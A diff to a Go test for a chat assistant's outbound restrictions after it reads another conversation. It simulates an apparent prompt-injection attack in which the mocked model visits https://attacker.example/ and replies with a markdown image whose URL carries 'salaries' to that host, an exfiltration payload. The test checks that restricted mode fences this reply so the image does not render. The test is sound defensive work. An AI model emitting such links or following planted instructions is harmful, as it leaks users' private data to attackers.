@@ -529,14 +529,17 @@ func TestReplyThatReadAnotherConversationSendsNothingOutUnlessUnrestricted(t *te
 	for _, restrict := range []bool{true, false} {
 		f := newFixture(t)
 		refused := "call_2 " + f.catalog.Text("tool.outbound.refused")
-		f.settings.s = &config.Settings{Model: "chat-model", RestrictOutboundAfterCrossReads: restrict}
+		f.settings.s = &config.Settings{Model: "chat-model", RestrictOutboundAfterCrossReads: restrict,
+			KBBatchKey: "agent:public_kb_batch", AssistantLabel: "agent"}
 		f.lookup.readFrom = "c2"
 		f.model.toolCalls = [][]model.ToolCall{
 			{{ID: "call_1", Name: "lookup", Arguments: json.RawMessage(`{}`)}},
 			{{ID: "call_2", Name: "search_web", Arguments: json.RawMessage(`{"query": "planted"}`)},
 				{ID: "call_3", Name: "visit_page", Arguments: json.RawMessage(`{"url": "https://attacker.example/"}`)}},
 		}
-		f.answer(t, job("dm:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "hi", Kind: chat.Direct}))
+		planted := "Done ![status](https://attacker.example/s.png?d=salaries)"
+		f.model.answers = []string{planted}
+		f.answer(t, job("thread:p1:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "@helper hi", Kind: chat.Public}))
 		reqs := f.model.received()
 		var results []string
 		for _, m := range reqs[len(reqs)-1].Messages {
@@ -549,6 +552,22 @@ func TestReplyThatReadAnotherConversationSendsNothingOutUnlessUnrestricted(t *te
 		}
 		if !restrict && !slices.Equal(f.web.requests, []string{"planted", "https://attacker.example/"}) {
 			t.Errorf("unrestricted: web requests %q, want the search and the page", f.web.requests)
+		}
+		want := map[bool]string{true: "```\n" + planted + "\n```", false: planted}[restrict]
+		if posts := f.chat.sent(); len(posts) != 1 || posts[0].Text != want {
+			t.Errorf("restrict=%t: posted %+v, want %q", restrict, posts, want)
+		}
+		saved, _ := json.Marshal(want)
+		for _, w := range f.history.written() {
+			if !strings.Contains(w, `"assistant":`+string(saved)) {
+				t.Errorf("restrict=%t: history write %s, want the reply as posted", restrict, w)
+			}
+		}
+		raw, _, _ := f.learning.Get(t.Context(), "agent:public_kb_batch")
+		var batch struct{ Messages []struct{ Message string } }
+		_ = json.Unmarshal(raw, &batch)
+		if len(batch.Messages) != 1 || batch.Messages[0].Message != "u1: @helper hi\nagent: "+want {
+			t.Errorf("restrict=%t: learning batch = %s, want the reply as posted", restrict, raw)
 		}
 	}
 }
